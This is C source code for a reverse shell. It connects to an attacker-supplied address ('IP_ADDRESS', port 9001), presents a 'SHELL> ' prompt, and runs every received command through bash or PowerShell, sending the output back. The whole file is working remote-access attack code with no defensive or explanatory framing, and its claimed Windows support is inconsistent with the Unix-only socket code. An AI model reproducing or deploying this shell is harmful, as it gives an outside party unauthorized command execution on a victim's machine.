// windows (Linux / Unix)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>

#define BUFFER_SIZE 4096

// Function to execute command and capture output
// Returns dynamically allocated string with output, caller must free
char* execute_command(const char* command) {
    char* output = NULL;
    size_t output_size = 0;
    FILE* fp = NULL;

#ifdef _WIN32
    // Windows: use PowerShell
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "powershell -Command \"%s\"", command);
    fp = _popen(cmdline, "r");
#else
    // Unix-like: use bash
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "%s 2>&1", command);
    fp = popen(cmdline, "r");
#endif

    if (fp == NULL) {
        output = strdup("Error executing command\n");
        return output;
    }

    char buffer[BUFFER_SIZE];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, output_size + len + 1);
        if (!new_output) {
            free(output);
            pclose(fp);
            return strdup("Memory allocation error\n");
        }
        output = new_output;
        memcpy(output + output_size, buffer, len);
        output_size += len;
        output[output_size] = '\0';
    }

#ifdef _WIN32
    _pclose(fp);
#else
    pclose(fp);
#endif

    if (!output) {
        output = strdup("");
    }

    return output;
}

int main() {
    const char* host = "IP_ADDRESS";
    const int port = 9001;
    int sock = -1;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid address: %s\n", host);
        close(sock);
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    // Send initial prompt
    const char* prompt = "SHELL> ";
    if (send(sock, prompt, strlen(prompt), 0) < 0) {
        perror("send");
        close(sock);
        return 1;
    }

    char recv_buffer[BUFFER_SIZE];
    while (1) {
        ssize_t received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
        if (received < 0) {
            perror("recv");
            break;
        } else if (received == 0) {
            // Connection closed
            break;
        }

        recv_buffer[received] = '\0';

        // Remove trailing newline characters
        while (received > 0 && (recv_buffer[received-1] == '\n' || recv_buffer[received-1] == '\r')) {
            recv_buffer[received-1] = '\0';
            received--;
        }

        if (strcasecmp(recv_buffer, "exit") == 0) {
            break;
        }

        char* output = execute_command(recv_buffer);
        if (!output) {
            output = strdup("Error executing command\n");
        }

        // Append prompt to output
        size_t out_len = strlen(output);
        size_t prompt_len = strlen(prompt);
        char* response = malloc(out_len + prompt_len + 1);
        if (!response) {
            free(output);
            fprintf(stderr, "Memory allocation error\n");
            break;
        }
        memcpy(response, output, out_len);
        memcpy(response + out_len, prompt, prompt_len);
        response[out_len + prompt_len] = '\0';

        free(output);

        if (send(sock, response, strlen(response), 0) < 0) {
            perror("send");
            free(response);
            break;
        }
        free(response);
    }

    close(sock);
    return 0;
}